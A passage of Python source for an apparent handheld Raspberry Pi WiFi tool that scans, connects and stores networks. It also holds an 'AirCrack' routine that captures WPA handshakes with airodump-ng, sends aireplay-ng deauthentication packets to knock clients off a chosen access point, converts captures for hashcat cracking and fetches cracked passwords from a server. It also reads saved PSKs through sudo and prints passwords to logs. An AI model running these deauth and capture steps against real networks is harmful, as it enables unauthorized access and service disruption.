                if r.returncode == 0 or self._get_iface_mode_num(base_iface) == 1:
                    print(f"[WIFI MODE] {base_iface} -> MONITOR mode OK")
                    return True, base_iface
                # Fallback airmon-ng
                subprocess.run(["sudo", "-n", "airmon-ng", "start", base_iface], capture_output=True, timeout=8)
                ifaces = self._list_wireless_interfaces()
                mon_if = f"{base_iface}mon" if f"{base_iface}mon" in ifaces else base_iface
                return (self._get_iface_mode_num(mon_if) == 1), mon_if
            except Exception as e:
                print(f"[WIFI MODE] Loi bat Monitor mode tren {base_iface}: {e}")
                return False, base_iface

        elif mode in (0, 3):  # MANAGED / CLIENT MODE
            self._stop_capture_proc()
            try:
                if iface.endswith("mon") or f"{base_iface}mon" in self._list_wireless_interfaces():
                    subprocess.run(["sudo", "-n", "airmon-ng", "stop", f"{base_iface}mon"], capture_output=True, timeout=6)
                subprocess.run(["sudo", "-n", "ip", "link", "set", base_iface, "down"], capture_output=True, timeout=4)
                subprocess.run(["sudo", "-n", "iw", "dev", base_iface, "set", "type", "managed"], capture_output=True, timeout=4)
                subprocess.run(["sudo", "-n", "ip", "link", "set", base_iface, "up"], capture_output=True, timeout=4)
                subprocess.run(["sudo", "-n", "nmcli", "dev", "set", base_iface, "managed", "yes"], capture_output=True, timeout=4)
                time.sleep(0.6)
                print(f"[WIFI MODE] {base_iface} -> MANAGED mode OK")
                return True, base_iface
            except Exception as e:
                print(f"[WIFI MODE] Loi chuyen Managed mode tren {base_iface}: {e}")
                return False, base_iface

        elif mode == 2:  # AP / HOTSPOT MODE
            self._set_interface_mode(base_iface, 0)
            if self.hotspot_service:
                ok, _ = self.hotspot_service.start_hotspot(interface_mode=0)
                return ok, base_iface
            try:
                ap_ssid = (self.wifi_config or {}).get("hotspot", {}).get("ssid", "PiPortable_WiFi")
                ap_pw = (self.wifi_config or {}).get("hotspot", {}).get("password") or os.environ.get("HOTSPOT_PASSWORD", "")
                cmd = ["sudo", "-n", "nmcli", "dev", "wifi", "hotspot", "ifname", base_iface, "ssid", ap_ssid]
                if ap_pw:
                    cmd.extend(["password", ap_pw])
                r = subprocess.run(
                    cmd,
                    capture_output=True, text=True, timeout=10,
                )
                return (r.returncode == 0), base_iface
            except Exception:
                return False, base_iface

        return True, base_iface

    def _scan_wifi_networks_real(self, force_rescan: bool = True) -> List[Dict[str, Any]]:
        """Quet danh sach WiFi thuc te qua nmcli / iw tren Linux."""
        if not sys.platform.startswith("linux"):
            return [{"ssid": "Test_WIFI", "display": "Test_WIFI", "signal": 85, "channel": 6, "bssid": "A8:42:A1:38:D3:BB"}]

        import subprocess, re
        iface, _ = self._resolve_wireless_iface(for_aircrack=False)
        # Dam bao card o che do managed de quet SSID day du
        if self._get_iface_mode_num(iface) == 1:
            _, iface = self._set_interface_mode(iface, 0)
            time.sleep(1.0)

        results: List[Dict[str, Any]] = []
        seen_ssids = set()

        try:
            proc = None
            if force_rescan:
                try:
                    proc = subprocess.run(
                        ["nmcli", "-t", "-f", "BSSID,SSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list", "ifname", iface, "--rescan", "yes"],
                        capture_output=True, text=True, timeout=4,
                    )
                except subprocess.TimeoutExpired:
                    proc = None
            if proc is None or proc.returncode != 0 or not proc.stdout.strip():
                proc = subprocess.run(
                    ["nmcli", "-t", "-f", "BSSID,SSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list", "--rescan", "no"],
                    capture_output=True, text=True, timeout=4,
                )
            for raw_line in proc.stdout.splitlines():
                line = raw_line.strip()
                if not line:
                    continue
                # nmcli -t escapes ':' inside BSSID as '\:'
                line_norm = line.replace("\\:", "#COLON#")
                parts = line_norm.split(":")
                if len(parts) < 4:
                    continue
                bssid = parts[0].replace("#COLON#", ":").strip()
                ssid = parts[1].replace("#COLON#", ":").strip()
                try:
                    chan = int(parts[2].strip())
                except Exception:
                    chan = 1
                try:
                    sig = int(parts[3].strip())
                except Exception:
                    sig = 50
                sec = parts[4].strip() if len(parts) >= 5 else ""
                if not ssid or ssid == "--":
                    continue
                if ssid not in seen_ssids:
                    seen_ssids.add(ssid)
                    results.append({
                        "ssid": ssid,
                        "display": self._to_lcd_ascii(ssid, 12),
                        "signal": max(0, min(100, sig)),
                        "channel": max(1, min(165, chan)),
                        "bssid": bssid,
                        "security": sec,
                    })
        except Exception as e:
            print(f"[WIFI SCAN] nmcli scan err: {e}")

        # Fallback: dung `sudo -n iw dev <iface> scan` neu nmcli chua kip cap nhat
        if not results:
            try:
                subprocess.run(["sudo", "-n", "ip", "link", "set", iface, "up"], capture_output=True, timeout=3)
                out = subprocess.check_output(["sudo", "-n", "iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=8)
                cur_bssid = ""
                cur_ssid = ""
                cur_sig = 50
                cur_chan = 1
                for line in out.splitlines():
                    s = line.strip()
                    if s.startswith("BSS "):
                        if cur_ssid and cur_ssid not in seen_ssids:
                            seen_ssids.add(cur_ssid)
                            results.append({
                                "ssid": cur_ssid,
                                "display": self._to_lcd_ascii(cur_ssid, 12),
                                "signal": cur_sig,
                                "channel": cur_chan,
                                "bssid": cur_bssid,
                                "security": "WPA2",
                            })
                        m = re.match(r"BSS\s+([0-9a-fA-F:]{17})", s)
                        cur_bssid = m.group(1).upper() if m else ""
                        cur_ssid = ""
                        cur_sig = 50
                        cur_chan = 1
                    elif s.startswith("SSID:"):
                        cur_ssid = s[5:].strip()
                    elif s.startswith("signal:"):
                        try:
                            dbm = float(s.split()[1])
                            cur_sig = max(0, min(100, int(2 * (dbm + 100))))
                        except Exception:
                            pass
                    elif "DS Parameter set: channel" in s:
                        try:
                            cur_chan = int(s.split()[-1])
                        except Exception:
                            pass
                if cur_ssid and cur_ssid not in seen_ssids:
                    seen_ssids.add(cur_ssid)
                    results.append({
                        "ssid": cur_ssid,
                        "display": self._to_lcd_ascii(cur_ssid, 12),
                        "signal": cur_sig,
                        "channel": cur_chan,
                        "bssid": cur_bssid,
                        "security": "WPA2",
                    })
            except Exception as e:
                print(f"[WIFI SCAN] iw scan err: {e}")

        results.sort(key=lambda x: x.get("signal", 0), reverse=True)
        return results

    def _load_known_wifi_list(self) -> List[Dict[str, str]]:
        """Hop nhat danh sach Known WiFi tu known_wifi.json, os_settings.json va NetworkManager."""
        known: List[Dict[str, str]] = []
        seen = set()

        def add_item(ssid: str, password: str = "") -> None:
            if not ssid or ssid in ("--", "PiPortable_WiFi", "Hotspot", "lo"):
                return
            if ssid in seen:
                if password:
                    for it in known:
                        if it["ssid"] == ssid and not it.get("password"):
                            it["password"] = password
                return
            seen.add(ssid)
            known.append({
                "ssid": ssid,
                "display": self._to_lcd_ascii(ssid, 12),
                "password": password or "",
            })

        # 1. Doc tu known_wifi.json trong wifi_manager_portable & Engine/python
        home_dir = os.path.expanduser("~")
        cand_files = [
            os.path.join(BASE_DIR, "known_wifi.json"),
            os.path.join(home_dir, "AC_NG", "wifi_manager_portable", "known_wifi.json"),
        ]
        if self._found_portable_dir:
            cand_files.insert(0, os.path.join(self._found_portable_dir, "known_wifi.json"))
        for fpath in cand_files:
            if os.path.exists(fpath):
                try:
                    with open(fpath, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    if isinstance(data, list):
                        for item in data:
                            if isinstance(item, dict) and item.get("ssid"):
                                add_item(str(item["ssid"]), str(item.get("password", "")))
                except Exception:
                    pass

        # 2. Doc tu os_settings.json["apps"]["wifi_known"]
        wk = self.settings.get("apps", {}).get("wifi_known", [])
        if isinstance(wk, list):
            for item in wk:
                if isinstance(item, dict) and item.get("ssid"):
                    add_item(str(item["ssid"]), str(item.get("password", "")))
                elif isinstance(item, str):
                    add_item(item, "")

        # 3. Doc cac profile WiFi da luu trong NetworkManager tren Linux
        if sys.platform.startswith("linux"):
            import subprocess
            try:
                out = subprocess.check_output(
                    ["nmcli", "-t", "-f", "NAME,TYPE", "connection", "show"],
                    text=True, timeout=3,
                )
                for line in out.splitlines():
                    parts = line.strip().split(":")
                    if len(parts) >= 2 and "wireless" in parts[-1]:
                        cname = ":".join(parts[:-1]).strip()
                        if cname and not cname.startswith("Hotspot"):
                            nm_pw = ""
                            try:
                                pw_out = subprocess.check_output(
                                    ["sudo", "-n", "nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", cname],
                                    text=True, stderr=subprocess.DEVNULL, timeout=2,
                                ).strip()
                                if pw_out and pw_out != "--":
                                    nm_pw = pw_out
                            except Exception:
                                pass
                            add_item(cname, nm_pw)
            except Exception:
                pass

        return known

    def _save_known_wifi(self, ssid: str, password: str) -> None:
        """Luu WiFi (ssid, password) vao known_wifi.json va os_settings.json."""
        if not ssid:
            return
        known = self._load_known_wifi_list()
        updated = False
        for it in known:
            if it["ssid"] == ssid:
                if password:
                    it["password"] = password
                updated = True
                break
        if not updated:
            known.insert(0, {"ssid": ssid, "display": self._to_lcd_ascii(ssid, 12), "password": password})

        save_list = [{"ssid": it["ssid"], "password": it.get("password", "")} for it in known]
        self.settings.setdefault("apps", {})["wifi_known"] = save_list
        save_settings(self.settings)

        home_portable = os.path.join(os.path.expanduser("~"), "AC_NG", "wifi_manager_portable")
        target_files = [os.path.join(BASE_DIR, "known_wifi.json")]
        if self._found_portable_dir:
            target_files.append(os.path.join(self._found_portable_dir, "known_wifi.json"))
        elif os.path.exists(home_portable):
            target_files.append(os.path.join(home_portable, "known_wifi.json"))

        for fpath in target_files:
            try:
                with open(fpath, "w", encoding="utf-8") as f:
                    json.dump(save_list, f, indent=2, ensure_ascii=False)
            except Exception:
                pass
        self._known_wifi_cache = known

    def handle_wifi_scan_item_request(self, index: int) -> None:
        now = time.time()
        if index == 0 or not self._wifi_scan_cache or (now - self._wifi_scan_time > 20.0):
            print(f"[WIFISET] <<< Quet WiFi thuc te (index={index})...")
            self._wifi_scan_cache = self._scan_wifi_networks_real(force_rescan=(index == 0))
            self._wifi_scan_time = time.time()

        if not self._wifi_scan_cache:
            payload = bytes([0, 0, 7]) + b"No WiFi" + bytes([0])
            self.send_packet(0x8C, payload)
            return

        total = len(self._wifi_scan_cache)
        idx = max(0, min(index, total - 1))
        it = self._wifi_scan_cache[idx]
        disp = it.get("display") or self._to_lcd_ascii(it.get("ssid", ""), 12)
        ssid_b = disp.encode("ascii", errors="replace")[:12]
        sig = int(it.get("signal", 0)) & 0xFF
        payload = bytes([idx, total, len(ssid_b)]) + ssid_b + bytes([sig])
        self.send_packet(0x8C, payload)
        print(f"[WIFISET] >>> Scan item [{idx+1}/{total}]: '{it.get('ssid')}' ({sig}%)")

    def handle_wifi_known_item_request(self, index: int) -> None:
        if index == 0 or not self._known_wifi_cache:
            self._known_wifi_cache = self._load_known_wifi_list()

        if not self._known_wifi_cache:
            payload = bytes([0, 0, 8]) + b"No Known"
            self.send_packet(0x8D, payload)
            return

        total = len(self._known_wifi_cache)
        idx = max(0, min(index, total - 1))
        it = self._known_wifi_cache[idx]
        disp = it.get("display") or self._to_lcd_ascii(it.get("ssid", ""), 12)
        ssid_b = disp.encode("ascii", errors="replace")[:12]
        payload = bytes([idx, total, len(ssid_b)]) + ssid_b
        self.send_packet(0x8D, payload)
        print(f"[WIFISET] >>> Known item [{idx+1}/{total}]: '{it.get('ssid')}'")

    def handle_wifiset_action(self, action: int, extra: int) -> None:
        """Xu ly CMD_WIFISET_ACTION (0x19) tu Arduino WifiSetApp."""
        print(f"[WIFISET] <<< Action=0x{action:02X}, Extra=0x{extra:02X}")
        if action == 0x01:
            self.handle_wifi_scan_item_request(extra)
            return
        if action == 0x02:
            self.handle_wifi_known_item_request(extra)
            return

        iface, iface_idx = self._resolve_wireless_iface(for_aircrack=False)

        if action == 0x03:  # WIFiset_ACTION_CONNECT_AUTO
            ssid = ""
            password = ""
            is_known_network = False
            self._known_wifi_cache = self._load_known_wifi_list()

            if extra & 0x80:
                scan_idx = extra & 0x7F
                if 0 <= scan_idx < len(self._wifi_scan_cache):
                    ssid = self._wifi_scan_cache[scan_idx].get("ssid", "")
                    for kw in self._known_wifi_cache:
                        if kw.get("ssid") == ssid:
                            is_known_network = True
                            password = kw.get("password", "")
                            break
                    if not is_known_network:
                        for kw in self._known_wifi_cache:
                            if kw.get("ssid", "").lower() == ssid.lower() and kw.get("password"):
                                is_known_network = True
                                password = kw["password"]
                                break
            else:
                is_known_network = True
                if 0 <= extra < len(self._known_wifi_cache):
                    ssid = self._known_wifi_cache[extra].get("ssid", "")
                    password = self._known_wifi_cache[extra].get("password", "")

            if not ssid:
                msg_b = b"No SSID"
                self.send_packet(0x8E, bytes([0, iface_idx, 0, len(msg_b)]) + msg_b)
                return

            _, iface = self._set_interface_mode(iface, 0)
            ok = False
            need_password = False
            if sys.platform.startswith("linux"):
                import subprocess
                try:
                    has_nm_profile = False
                    chk = subprocess.run(["nmcli", "-t", "-f", "NAME", "connection", "show"], capture_output=True, text=True, timeout=3)
                    if ssid in [l.strip() for l in chk.stdout.splitlines()]:
                        has_nm_profile = True
                        is_known_network = True

                    if not is_known_network and not password and not has_nm_profile:
                        # Mang tu Scan WiFi ma CHUA CO trong Known WiFi -> bao st=2 de mo Keyboard nhap mat khau ngay
                        need_password = True
                    else:
                        if password:
                            subprocess.run(["sudo", "-n", "nmcli", "connection", "delete", ssid], capture_output=True, timeout=3)
                            r = subprocess.run(
                                ["sudo", "-n", "nmcli", "-w", "10", "dev", "wifi", "connect", ssid, "password", password, "ifname", iface],
                                capture_output=True, text=True, timeout=12,
                            )
                            if r.returncode != 0 and "no network with ssid" in (r.stderr + r.stdout).lower():
                                subprocess.run(["sudo", "-n", "nmcli", "dev", "wifi", "rescan", "ifname", iface], capture_output=True, timeout=4)
                                time.sleep(1.2)
                                r = subprocess.run(
                                    ["sudo", "-n", "nmcli", "-w", "10", "dev", "wifi", "connect", ssid, "password", password, "ifname", iface],
                                    capture_output=True, text=True, timeout=12,
                                )
                            ok = (r.returncode == 0 and "successfully activated" in r.stdout.lower())
                        elif has_nm_profile:
                            r = subprocess.run(
                                ["sudo", "-n", "nmcli", "-w", "10", "connection", "up", ssid, "ifname", iface],
                                capture_output=True, text=True, timeout=12,
                            )
                            ok = (r.returncode == 0)
                        else:
                            # Co trong Known WiFi nhung khong luu mat khau (mang Open hoac profile cu)
                            r = subprocess.run(
                                ["sudo", "-n", "nmcli", "-w", "8", "dev", "wifi", "connect", ssid, "ifname", iface],
                                capture_output=True, text=True, timeout=10,
                            )
                            ok = (r.returncode == 0 and "successfully activated" in r.stdout.lower())
                except Exception as e:
                    print(f"[WIFISET] Auto-connect err: {e}")
                    ok = False

            disp_b = self._to_lcd_ascii(ssid, 12).encode("ascii", errors="replace")[:12]
            st = 1 if ok else (2 if need_password else 0)
            self.send_packet(0x8E, bytes([st, iface_idx, 0, len(disp_b)]) + disp_b)
            print(f"[WIFISET] >>> Connect Auto '{ssid}' (known={is_known_network}) on {iface}: {'SUCCESS' if ok else ('NEED_PW' if need_password else 'FAIL')}")
            return

        if action == 0x06:  # WIFiset_ACTION_QUERY_STATUS
            mode_num = self._get_iface_mode_num(iface)
            conn_ssid = ""
            st = 0
            if sys.platform.startswith("linux"):
                import subprocess
                try:
                    out = subprocess.check_output(
                        ["nmcli", "-t", "-f", "GENERAL.STATE,GENERAL.CONNECTION,IP4.ADDRESS", "dev", "show", iface],
                        text=True, timeout=3,
                    )
                    conn_name = ""
                    ip_addr = ""
                    for line in out.splitlines():
                        if line.startswith("GENERAL.STATE:") and "100" in line:
                            st = 1
                        elif line.startswith("GENERAL.CONNECTION:"):
                            val = line.split(":", 1)[1].strip()
                            if val and val != "--":
                                conn_name = val
                        elif line.startswith("IP4.ADDRESS"):
                            val = line.split(":", 1)[1].strip().split("/")[0]
                            if val:
                                ip_addr = val
                    if conn_name:
                        conn_ssid = f"{self._to_lcd_ascii(conn_name, 8)} {ip_addr.split('.')[-1]}" if ip_addr else self._to_lcd_ascii(conn_name, 12)
                    elif mode_num == 1:
                        conn_ssid = f"{iface}:MONITOR"
                    else:
                        conn_ssid = f"{iface}:Disconn"
                except Exception:
                    conn_ssid = f"{iface}:MD{mode_num}"
            else:
                conn_ssid = "WinDev Online"
                st = 1

            ssid_b = conn_ssid.encode("ascii", errors="replace")[:12]
            self.send_packet(0x8E, bytes([st, iface_idx, mode_num, len(ssid_b)]) + ssid_b)
            print(f"[WIFISET] >>> Status: iface={iface}({iface_idx}) mode={mode_num} info='{conn_ssid}'")

    def handle_wifi_connect_password(self, index: int, password: str) -> None:
        iface, iface_idx = self._resolve_wireless_iface(for_aircrack=False)
        ssid = ""
        if index & 0x80:
            scan_idx = index & 0x7F
            if 0 <= scan_idx < len(self._wifi_scan_cache):
                ssid = self._wifi_scan_cache[scan_idx].get("ssid", "")
        else:
            if not self._known_wifi_cache:
                self._known_wifi_cache = self._load_known_wifi_list()
            if 0 <= index < len(self._known_wifi_cache):
                ssid = self._known_wifi_cache[index].get("ssid", "")
            elif 0 <= index < len(self._wifi_scan_cache):
                ssid = self._wifi_scan_cache[index].get("ssid", "")

        print(f"[WIFISET] <<< Connect with password: index=0x{index:02X} ssid='{ssid}' pw='{password}' on {iface}")
        if not ssid:
            msg_b = b"No SSID"
            self.send_packet(0x8E, bytes([0, iface_idx, 0, len(msg_b)]) + msg_b)
            return

        _, iface = self._set_interface_mode(iface, 0)
        ok = False
        if sys.platform.startswith("linux"):
            import subprocess
            try:
                subprocess.run(["sudo", "-n", "nmcli", "connection", "delete", ssid], capture_output=True, timeout=3)
                cmd = ["sudo", "-n", "nmcli", "-w", "10", "dev", "wifi", "connect", ssid, "ifname", iface]
                if password:
                    cmd.extend(["password", password])
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
                ok = (r.returncode == 0 and "successfully activated" in r.stdout.lower())
                if not ok:
                    print(f"[WIFISET] nmcli connect output: {r.stdout.strip()} | {r.stderr.strip()}")
            except Exception as e:
                print(f"[WIFISET] Connect password err: {e}")
                ok = False
        else:
            ok = True

        if ok:
            self._save_known_wifi(ssid, password)

        disp_b = self._to_lcd_ascii(ssid, 12).encode("ascii", errors="replace")[:12]
        self.send_packet(0x8E, bytes([1 if ok else 0, iface_idx, 0, len(disp_b)]) + disp_b)
        print(f"[WIFISET] >>> Connect result for '{ssid}': {'OK' if ok else 'FAIL'}")

    def handle_wifi_card_mode(self, card: int, mode: int) -> None:
        print(f"[WIFISET] <<< Set Card {card} -> Mode {mode}")
        apps = self.settings.setdefault("apps", {})
        ws = apps.setdefault("wifi_set", {})
        modes = ws.get("card_modes", [0, 0, 0, 0])
        if not isinstance(modes, list) or len(modes) < 4:
            modes = [0, 0, 0, 0]
        if 0 <= card < 4:
            modes[card] = mode
        ws["card_modes"] = modes
        ws["iface_mode"] = card
        save_settings(self.settings)

        iface, _ = self._resolve_wireless_iface(card_idx=card, for_aircrack=False)
        self._set_interface_mode(iface, mode)

    def _scan_aircrack_aps_real(self) -> List[Dict[str, Any]]:
        """Quet danh sach AP thuc te (BSSID, SSID, Channel, Power) cho AirCrackApp."""
        if not sys.platform.startswith("linux"):
            return [{"bssid": "A8:42:A1:38:D3:BB", "ssid": "Test_WIFI", "label": "Test_WIFI", "channel": 6, "power": 74}]

        import subprocess, glob, csv
        iface, _ = self._resolve_wireless_iface(for_aircrack=True)
        mode_num = self._get_iface_mode_num(iface)
        aps: List[Dict[str, Any]] = []

        # Neu dang o Monitor mode, thu quet nhanh bang airodump-ng CSV (3s)
        if mode_num == 1:
            try:
                for old_f in glob.glob("/tmp/ac_quickscan*"):
                    try:
                        os.remove(old_f)
                    except Exception:
                        pass
                p = subprocess.Popen(
                    ["sudo", "-n", "airodump-ng", "--write", "/tmp/ac_quickscan", "--output-format", "csv", "--write-interval", "1", iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )
                time.sleep(3.2)
                p.terminate()
                try:
                    p.wait(timeout=1.5)
                except Exception:
                    p.kill()

                csv_files = sorted(glob.glob("/tmp/ac_quickscan*.csv"))
                if csv_files:
                    with open(csv_files[-1], "r", encoding="utf-8", errors="replace") as f:
                        lines = f.read().splitlines()
                    in_ap_section = False
                    for line in lines:
                        s = line.strip()
                        if not s:
                            if in_ap_section:
                                break
                            continue
                        if s.startswith("BSSID,"):
                            in_ap_section = True
                            continue
                        if s.startswith("Station MAC,"):
                            break
                        if in_ap_section:
                            cols = [c.strip() for c in s.split(",")]
                            if len(cols) >= 14 and len(cols[0]) == 17:
                                bssid = cols[0].upper()
                                try:
                                    ch = int(cols[3])
                                except Exception:
                                    ch = 1
                                if ch <= 0 or ch > 165:
                                    ch = 1
                                try:
                                    pwr_dbm = int(cols[8])
                                    pwr = abs(pwr_dbm) if pwr_dbm < 0 else pwr_dbm
                                except Exception:
                                    pwr = 50
                                ssid = cols[13]
                                label = self._to_lcd_ascii(ssid, 12) if ssid else bssid.replace(":", "")[:12]
                                aps.append({
                                    "bssid": bssid,
                                    "ssid": ssid or bssid,
                                    "label": label,
                                    "channel": ch,
                                    "power": max(1, min(100, pwr)),
                                })
            except Exception as e:
                print(f"[AIRCRACK] airodump quickscan err: {e}")

        # Neu Managed mode hoac airodump chua thay AP -> dung scan thuc te tu nmcli / iw
        if not aps:
            nets = self._scan_wifi_networks_real(force_rescan=True)
            for n in nets:
                bssid = n.get("bssid") or "00:11:22:33:44:55"
                ssid = n.get("ssid") or bssid
                label = self._to_lcd_ascii(ssid, 12) if ssid else bssid.replace(":", "")[:12]
                aps.append({
                    "bssid": bssid,
                    "ssid": ssid,
                    "label": label,
                    "channel": int(n.get("channel", 1)),
                    "power": int(n.get("signal", 50)),
                })

        return aps

    def _get_aircrack_server_url(self) -> str:
        """Lay URL cua server_wifi (mac dinh 169.254.84.122:9000 tren ket noi Ethernet Pi <-> PC)."""
        ac = self.settings.get("apps", {}).get("aircrack", {})
        srv = str(ac.get("server_ip", "")).strip()
        if not srv:
            srv = "169.254.84.122:9000"
        if ":" not in srv:
            srv = f"{srv}:9000"
        if not srv.startswith("http"):
            srv = f"http://{srv}"
        return srv.rstrip("/")

    def _list_hc22000_files(self) -> List[str]:
        """Tim tat ca cac file .hc22000 hop le trong aircrack_files/ va thu muc home."""
        import glob, shutil
        ac_dir = os.path.join(BASE_DIR, "aircrack_files")
        os.makedirs(ac_dir, exist_ok=True)
        home_dir = os.path.expanduser("~")

        # Dong bo cac file .hc22000 co san o thu muc home vao aircrack_files
        for ext_p in glob.glob(os.path.join(home_dir, "*.hc22000")):
            try:
                if os.path.getsize(ext_p) > 0:
                    dst = os.path.join(ac_dir, os.path.basename(ext_p))
                    if not os.path.exists(dst) or os.path.getsize(dst) == 0:
                        shutil.copy2(ext_p, dst)
            except Exception:
                pass

        valid_paths: List[str] = []
        for p in sorted(glob.glob(os.path.join(ac_dir, "*.hc22000"))):
            try:
                if os.path.getsize(p) > 0:
                    valid_paths.append(p)
            except Exception:
                pass
        self._hcf_files_cache = valid_paths
        return valid_paths

    def handle_aircrack_action(self, action: int, extra: int) -> None:
        import subprocess, glob, urllib.request, urllib.error
        iface, iface_idx = self._resolve_wireless_iface(for_aircrack=True)
        print(f"[AIRCRACK] <<< Action=0x{action:02X} Extra=0x{extra:02X} on {iface}")
        msg = "OK"

        if action == 0x01:  # Select Target AP
            if not self._aircrack_scan_cache:
                self._aircrack_scan_cache = self._scan_aircrack_aps_real()
            if self._aircrack_scan_cache:
                idx = max(0, min(extra, len(self._aircrack_scan_cache) - 1))
                self._aircrack_target_idx = idx
                self._aircrack_target = self._aircrack_scan_cache[idx]
                t_label = self._aircrack_target.get("label", "Target")[:8]
                t_ch = self._aircrack_target.get("channel", 1)
                msg = f"T:{t_label} C{t_ch}"
                print(f"[AIRCRACK] Selected Target [{idx}]: {self._aircrack_target}")
            else:
                msg = "No Target AP"

        elif action == 0x02:  # Enable Monitor Mode
            ok, mon_if = self._set_interface_mode(iface, 1)
            if ok:
                if self._aircrack_target and self._aircrack_target.get("channel"):
                    ch = int(self._aircrack_target["channel"])
                    subprocess.run(["sudo", "-n", "iw", "dev", mon_if, "set", "channel", str(ch)], capture_output=True, timeout=3)
                    msg = f"Mon ON Ch{ch}"
                else:
                    msg = f"Mon ON {mon_if[:5]}"
            else:
                msg = "Mon FAIL"

        elif action == 0x03:  # Capture Handshake (airodump-ng + deauth trigger)
            if not self._aircrack_target:
                if not self._aircrack_scan_cache:
                    self._aircrack_scan_cache = self._scan_aircrack_aps_real()
                if self._aircrack_scan_cache:
                    idx = max(0, min(extra, len(self._aircrack_scan_cache) - 1))
                    self._aircrack_target = self._aircrack_scan_cache[idx]

            ok, mon_if = self._set_interface_mode(iface, 1)
            if not ok:
                msg = "Mon Err"
            elif not self._aircrack_target:
                msg = "Sel Tgt 1st"
            else:
                bssid = self._aircrack_target["bssid"]
                ch = int(self._aircrack_target.get("channel", 6))
                label = self._aircrack_target.get("label", "ap")
                safe_name = "".join(c if c.isalnum() else "_" for c in label)[:8] or "ap"
                ac_dir = os.path.join(BASE_DIR, "aircrack_files")
                os.makedirs(ac_dir, exist_ok=True)
                out_prefix = os.path.join(ac_dir, f"cap_{safe_name}")

                self._stop_capture_proc()
                try:
                    subprocess.run(["sudo", "-n", "iw", "dev", mon_if, "set", "channel", str(ch)], capture_output=True, timeout=3)
                    self._capture_proc = subprocess.Popen(
                        [
                            "sudo", "-n", "airodump-ng",
                            "--bssid", bssid,
                            "--channel", str(ch),
                            "--write", out_prefix,
                            "--output-format", "pcap",
                            mon_if,
                        ],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    time.sleep(0.8)
                    # Gui 3 goi deauth ngam kich hoat bat tay EAPOL ma khong chan luong Capture
                    try:
                        subprocess.Popen(
                            ["sudo", "-n", "aireplay-ng", "--deauth", "3", "-a", bssid, mon_if],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                    except Exception:
                        pass
                    msg = f"Cap:{label[:7]}"
                    print(f"[AIRCRACK] Capturing BSSID={bssid} CH={ch} -> {out_prefix}-*.cap")
                except Exception as e:
                    print(f"[AIRCRACK] Capture err: {e}")
                    msg = "Cap Error"

        elif action == 0x04:  # Deauth Attack
            if not self._aircrack_target and self._aircrack_scan_cache:
                idx = max(0, min(extra, len(self._aircrack_scan_cache) - 1))
                self._aircrack_target = self._aircrack_scan_cache[idx]

            if not self._aircrack_target:
                msg = "No Target"
            else:
                ok, mon_if = self._set_interface_mode(iface, 1)
                bssid = self._aircrack_target["bssid"]
                ch = int(self._aircrack_target.get("channel", 6))
                try:
                    subprocess.run(["sudo", "-n", "iw", "dev", mon_if, "set", "channel", str(ch)], capture_output=True, timeout=3)
                    r = subprocess.run(
                        ["sudo", "-n", "aireplay-ng", "--deauth", "5", "-a", bssid, mon_if],
                        capture_output=True, text=True, timeout=8,
                    )
                    if r.returncode == 0 or "sending" in r.stdout.lower():
                        msg = f"Deauth OK C{ch}"
                    else:
                        msg = f"Deauth Ch{ch}"
                except subprocess.TimeoutExpired:
                    msg = f"Deauth Sent"
                except Exception as e:
                    print(f"[AIRCRACK] Deauth err: {e}")
                    msg = "Deauth Err"

        elif action == 0x05:  # Convert .cap -> .hc22000 via hcxpcapngtool
            self._stop_capture_proc()
            ac_dir = os.path.join(BASE_DIR, "aircrack_files")
            os.makedirs(ac_dir, exist_ok=True)
            cap_files = sorted(
                glob.glob(os.path.join(ac_dir, "*.cap"))
                + glob.glob(os.path.join(ac_dir, "*.pcap"))
                + glob.glob(os.path.join(os.path.expanduser("~"), "*.cap"))
            )
            converted = 0
            for cp in cap_files:
                base = os.path.splitext(os.path.basename(cp))[0]
                out_hc = os.path.join(ac_dir, f"{base}.hc22000")
                try:
                    subprocess.run(["hcxpcapngtool", "-o", out_hc, cp], capture_output=True, timeout=8)
                    if os.path.exists(out_hc) and os.path.getsize(out_hc) > 0:
                        converted += 1
                    elif os.path.exists(out_hc) and os.path.getsize(out_hc) == 0:
                        os.remove(out_hc)
                except Exception as e:
                    print(f"[AIRCRACK] hcxpcapngtool err on {cp}: {e}")

            all_hc = self._list_hc22000_files()
            msg = f"HC22k:{len(all_hc)} file"
            print(f"[AIRCRACK] Converted {converted} caps, total valid .hc22000 = {len(all_hc)}")

        elif action == 0x06:  # Server Status (GET /status)
            srv_url = self._get_aircrack_server_url()
            try:
                req = urllib.request.Request(f"{srv_url}/status", method="GET")
                with urllib.request.urlopen(req, timeout=4.0) as resp:
                    data = json.loads(resp.read().decode("utf-8"))
                cnt = data.get("cracked_count", 0)
                msg = f"SrvOK Crk:{cnt}"
                print(f"[AIRCRACK] Server Status OK ({srv_url}): {data}")
            except Exception as e:
                print(f"[AIRCRACK] Server Status FAIL ({srv_url}): {e}")
                msg = "Srv Offline"

        elif action == 0x07:  # Download Cracked WiFi from Server (GET /wifi)
            srv_url = self._get_aircrack_server_url()
            try:
                req = urllib.request.Request(f"{srv_url}/wifi", method="GET")
                with urllib.request.urlopen(req, timeout=5.0) as resp:
                    wifi_data = json.loads(resp.read().decode("utf-8"))
                wifi_list = wifi_data.get("items", []) if isinstance(wifi_data, dict) else wifi_data
                saved_cnt = 0
                if isinstance(wifi_list, list):
                    for item in wifi_list:
                        if isinstance(item, dict):
                            w_ssid = item.get("ssid") or ""
                            w_pw = item.get("password") or ""
                            if w_ssid and w_pw:
                                self._save_known_wifi(w_ssid, w_pw)
                                saved_cnt += 1
                            elif w_pw and item.get("file"):
                                fname_s = os.path.splitext(str(item["file"]))[0]
                                self._save_known_wifi(fname_s, w_pw)
                                saved_cnt += 1
                msg = f"Saved {saved_cnt} WiFi"
                print(f"[AIRCRACK] Downloaded {saved_cnt} cracked WiFis from {srv_url}")
            except Exception as e:
                print(f"[AIRCRACK] Download WiFi FAIL ({srv_url}): {e}")
                msg = "DL Error"

